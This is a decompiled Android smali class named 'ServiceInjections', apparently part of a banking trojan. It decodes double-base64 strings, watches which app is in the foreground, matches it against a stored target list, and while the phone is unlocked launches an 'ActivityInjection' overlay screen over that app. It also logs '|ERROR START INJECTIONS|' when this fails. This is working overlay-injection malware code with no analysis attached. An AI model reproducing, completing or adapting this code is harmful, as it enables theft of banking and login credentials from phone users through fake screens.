.class public Lnaqsl/ebxcb/exu/ServiceInjections;
.super Landroid/app/IntentService;
.source ""


# instance fields
.field fddo:Lnaqsl/ebxcb/exu/int;

.field for:Landroid/content/Context;

.field ifdf:Lnaqsl/ebxcb/exu/int;


# direct methods
.method public constructor <init>()V
    .registers 2

    const-string v0, ""

    invoke-direct {p0, v0}, Landroid/app/IntentService;-><init>(Ljava/lang/String;)V

    new-instance v0, Lnaqsl/ebxcb/exu/int;

    invoke-direct {v0}, Lnaqsl/ebxcb/exu/int;-><init>()V

    iput-object v0, p0, Lnaqsl/ebxcb/exu/ServiceInjections;->fddo:Lnaqsl/ebxcb/exu/int;

    new-instance v0, Lnaqsl/ebxcb/exu/int;

    invoke-direct {v0}, Lnaqsl/ebxcb/exu/int;-><init>()V

    iput-object v0, p0, Lnaqsl/ebxcb/exu/ServiceInjections;->ifdf:Lnaqsl/ebxcb/exu/int;

    new-instance v0, Lnaqsl/ebxcb/exu/ifdf;

    invoke-direct {v0}, Lnaqsl/ebxcb/exu/ifdf;-><init>()V

    return-void
.end method

.method private ifdf()Ljava/util/ArrayList;
    .registers 7
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Ljava/util/ArrayList<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation

    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const-string v2, "activity"

    const/16 v3, 0x13

    const/4 v4, 0x0

    if-gt v1, v3, :cond_31

    invoke-virtual {p0, v2}, Landroid/app/IntentService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/ActivityManager;

    const/4 v2, 0x1

    invoke-virtual {v1, v2}, Landroid/app/ActivityManager;->getRunningTasks(I)Ljava/util/List;

    move-result-object v1

    invoke-interface {v1, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/app/ActivityManager$RunningTaskInfo;

    iget-object v2, v2, Landroid/app/ActivityManager$RunningTaskInfo;->topActivity:Landroid/content/ComponentName;

    invoke-interface {v1, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/ActivityManager$RunningTaskInfo;

    iget-object v1, v1, Landroid/app/ActivityManager$RunningTaskInfo;->topActivity:Landroid/content/ComponentName;

    invoke-virtual {v1}, Landroid/content/ComponentName;->getPackageName()Ljava/lang/String;

    move-result-object v1

    :goto_2d
    invoke-virtual {v0, v1}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    return-object v0

    :cond_31
    const/16 v5, 0x15

    if-le v1, v3, :cond_4a

    if-gt v1, v5, :cond_4a

    invoke-virtual {p0, v2}, Landroid/app/IntentService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/ActivityManager;

    invoke-virtual {v1}, Landroid/app/ActivityManager;->getRunningAppProcesses()Ljava/util/List;

    move-result-object v1

    invoke-interface {v1, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/ActivityManager$RunningAppProcessInfo;

    iget-object v1, v1, Landroid/app/ActivityManager$RunningAppProcessInfo;->processName:Ljava/lang/String;

    goto :goto_2d

    :cond_4a
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    if-le v1, v5, :cond_78

    const/16 v2, 0x17

    if-gt v1, v2, :cond_78

    invoke-static {p0}, Lnaqsl/ebxcb/exu/fddo/for/ifdf;->fddo(Landroid/content/Context;)Ljava/util/List;

    move-result-object v0

    new-instance v1, Ljava/util/ArrayList;

    invoke-direct {v1}, Ljava/util/ArrayList;-><init>()V

    invoke-interface {v0}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v0

    :goto_5f
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v2

    if-eqz v2, :cond_77

    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Lnaqsl/ebxcb/exu/fddo/for/fddo;

    invoke-virtual {v2}, Lnaqsl/ebxcb/exu/fddo/for/fddo;->int()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    goto :goto_5f

    :cond_77
    return-object v1

    :cond_78
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x18

    iget-object v1, p0, Lnaqsl/ebxcb/exu/ServiceInjections;->fddo:Lnaqsl/ebxcb/exu/int;

    iget-object v2, p0, Lnaqsl/ebxcb/exu/ServiceInjections;->for:Landroid/content/Context;

    invoke-virtual {v1, v2}, Lnaqsl/ebxcb/exu/int;->goto(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v1

    goto :goto_2d
.end method


# virtual methods
.method fddo()V
    .registers 13

    iget-object v0, p0, Lnaqsl/ebxcb/exu/ServiceInjections;->fddo:Lnaqsl/ebxcb/exu/int;

    iget-object v1, p0, Lnaqsl/ebxcb/exu/ServiceInjections;->for:Landroid/content/Context;

    const-string v2, "YzJGMlpWOXBibW89"

    invoke-static {v2}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v1, v3}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const/4 v1, 0x0

    move-object v3, v0

    const/4 v0, 0x0

    :cond_15
    :goto_15
    if-nez v0, :cond_32

    iget-object v3, p0, Lnaqsl/ebxcb/exu/ServiceInjections;->fddo:Lnaqsl/ebxcb/exu/int;

    iget-object v4, p0, Lnaqsl/ebxcb/exu/ServiceInjections;->for:Landroid/content/Context;

    invoke-static {v2}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v4, v5}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/String;->length()I

    move-result v4

    const/4 v5, 0x4

    if-gt v4, v5, :cond_32

    invoke-virtual {p0}, Landroid/app/IntentService;->stopSelf()V

    return-void

    :cond_32
    const/16 v4, 0x28

    if-lt v0, v4, :cond_37

    const/4 v0, -0x1

    :cond_37
    const/4 v4, 0x1

    add-int/2addr v0, v4

    iget-object v5, p0, Lnaqsl/ebxcb/exu/ServiceInjections;->fddo:Lnaqsl/ebxcb/exu/int;

    invoke-virtual {v5, p0}, Lnaqsl/ebxcb/exu/int;->new(Landroid/content/Context;)Z

    move-result v5

    if-eqz v5, :cond_44

    invoke-virtual {p0}, Landroid/app/IntentService;->stopSelf()V

    :cond_44
    const-string v5, "keyguard"

    invoke-virtual {p0, v5}, Landroid/app/IntentService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Landroid/app/KeyguardManager;

    invoke-virtual {v6}, Landroid/app/KeyguardManager;->inKeyguardRestrictedInputMode()Z

    move-result v6

    const-wide/16 v7, 0xa

    if-nez v6, :cond_162

    const-string v6, ""

    if-eq v3, v6, :cond_15

    iget-object v6, p0, Lnaqsl/ebxcb/exu/ServiceInjections;->fddo:Lnaqsl/ebxcb/exu/int;

    iget-object v9, p0, Lnaqsl/ebxcb/exu/ServiceInjections;->for:Landroid/content/Context;

    invoke-virtual {v6, v9}, Lnaqsl/ebxcb/exu/int;->catch(Landroid/content/Context;)Z

    move-result v6

    if-eqz v6, :cond_15

    :try_start_62
    sget-object v6, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    invoke-virtual {v6, v7, v8}, Ljava/util/concurrent/TimeUnit;->sleep(J)V
    :try_end_67
    .catch Ljava/lang/InterruptedException; {:try_start_62 .. :try_end_67} :catch_68

    goto :goto_6c

    :catch_68
    move-exception v6

    invoke-virtual {v6}, Ljava/lang/InterruptedException;->printStackTrace()V

    :goto_6c
    invoke-direct {p0}, Lnaqsl/ebxcb/exu/ServiceInjections;->ifdf()Ljava/util/ArrayList;

    move-result-object v6

    const/4 v7, 0x0

    move-object v8, v7

    const/4 v7, 0x0

    :goto_73
    const-string v9, "THc9PQ=="

    invoke-static {v9}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    invoke-static {v10}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v3, v10}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v10

    array-length v10, v10

    if-ge v7, v10, :cond_b8

    invoke-static {v9}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v3, v9}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v9

    aget-object v9, v9, v7

    const-string v10, "TEE9PQ=="

    invoke-static {v10}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    invoke-static {v10}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v9

    const/4 v10, 0x1

    :goto_a1
    array-length v11, v9

    if-ge v10, v11, :cond_b2

    aget-object v11, v9, v10

    invoke-virtual {v6, v11}, Ljava/util/ArrayList;->contains(Ljava/lang/Object;)Z

    move-result v11

    if-eqz v11, :cond_af

    aget-object v8, v9, v1

    goto :goto_b2

    :cond_af
    add-int/lit8 v10, v10, 0x1

    goto :goto_a1

    :cond_b2
    :goto_b2
    if-eqz v8, :cond_b5

    goto :goto_b8

    :cond_b5
    add-int/lit8 v7, v7, 0x1

    goto :goto_73

    :cond_b8
    :goto_b8
    if-eqz v8, :cond_15

    invoke-virtual {p0, v5}, Landroid/app/IntentService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Landroid/app/KeyguardManager;

    invoke-virtual {v4}, Landroid/app/KeyguardManager;->inKeyguardRestrictedInputMode()Z

    move-result v4

    if-nez v4, :cond_15

    :try_start_c6
    iget-object v4, p0, Lnaqsl/ebxcb/exu/ServiceInjections;->fddo:Lnaqsl/ebxcb/exu/int;

    iget-object v5, p0, Lnaqsl/ebxcb/exu/ServiceInjections;->for:Landroid/content/Context;

    const-string v6, "Ym1GdFpRPT0="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v5, v6}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const-string v5, "ZEhKMVpRPT0="

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_15

    new-instance v4, Landroid/content/Intent;

    const-class v5, Lnaqsl/ebxcb/exu/Activity/ActivityInjection;

    invoke-direct {v4, p0, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v5, "YzNSeQ=="

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5, v8}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v4

    const/high16 v5, 0x10000000

    invoke-virtual {v4, v5}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v5, 0x800000

    invoke-virtual {v4, v5}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v5, 0x40000000    # 2.0f

    invoke-virtual {v4, v5}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v4}, Landroid/app/IntentService;->startActivity(Landroid/content/Intent;)V
    :try_end_10f
    .catch Ljava/lang/Exception; {:try_start_c6 .. :try_end_10f} :catch_111

    goto/16 :goto_15

    :catch_111
    iget-object v4, p0, Lnaqsl/ebxcb/exu/ServiceInjections;->fddo:Lnaqsl/ebxcb/exu/int;

    iget-object v5, p0, Lnaqsl/ebxcb/exu/ServiceInjections;->for:Landroid/content/Context;

    const-string v6, "TkE9PQ=="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "Y0QwPQ=="

    invoke-static {v8}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-static {v8}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v8, p0, Lnaqsl/ebxcb/exu/ServiceInjections;->fddo:Lnaqsl/ebxcb/exu/int;

    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v10, p0, Lnaqsl/ebxcb/exu/ServiceInjections;->fddo:Lnaqsl/ebxcb/exu/int;

    invoke-virtual {v10, p0}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v10, "ZkVWU1VrOVNJRk5VUVZKVUlFbE9Ta1ZEVkVsUFRsTjg="

    invoke-static {v10}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    invoke-static {v10}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Lnaqsl/ebxcb/exu/int;->for(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v4, v5, v6, v7}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    goto/16 :goto_15

    :cond_162
    :try_start_162
    sget-object v4, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    invoke-virtual {v4, v7, v8}, Ljava/util/concurrent/TimeUnit;->sleep(J)V
    :try_end_167
    .catch Ljava/lang/InterruptedException; {:try_start_162 .. :try_end_167} :catch_169

    goto/16 :goto_15

    :catch_169
    move-exception v4

    invoke-virtual {v4}, Ljava/lang/InterruptedException;->printStackTrace()V

    goto/16 :goto_15
.end method

.method protected onHandleIntent(Landroid/content/Intent;)V
    .registers 5

    iput-object p0, p0, Lnaqsl/ebxcb/exu/ServiceInjections;->for:Landroid/content/Context;

    iget-object p1, p0, Lnaqsl/ebxcb/exu/ServiceInjections;->fddo:Lnaqsl/ebxcb/exu/int;

    iget-object v0, p0, Lnaqsl/ebxcb/exu/ServiceInjections;->for:Landroid/content/Context;

    const-string v1, "Ym1GdFpRPT0="

    invoke-static {v1}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "Wm1Gc2MyVT0="

    invoke-static {v2}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p1, v0, v1, v2}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object p1, p0, Lnaqsl/ebxcb/exu/ServiceInjections;->fddo:Lnaqsl/ebxcb/exu/int;

    iget-object v0, p0, Lnaqsl/ebxcb/exu/ServiceInjections;->for:Landroid/content/Context;

    const-string v1, "YzJGMlpWOXBibW89"

    invoke-static {v1}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1, v0, v1}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result p1

    const/4 v0, 0x5

    if-gt p1, v0, :cond_39

    invoke-virtual {p0}, Landroid/app/IntentService;->stopSelf()V

    :cond_39
    :try_start_39
    invoke-virtual {p0}, Lnaqsl/ebxcb/exu/ServiceInjections;->fddo()V
    :try_end_3c
    .catch Ljava/lang/Exception; {:try_start_39 .. :try_end_3c} :catch_3c

    :catch_3c
    return-void
.end method
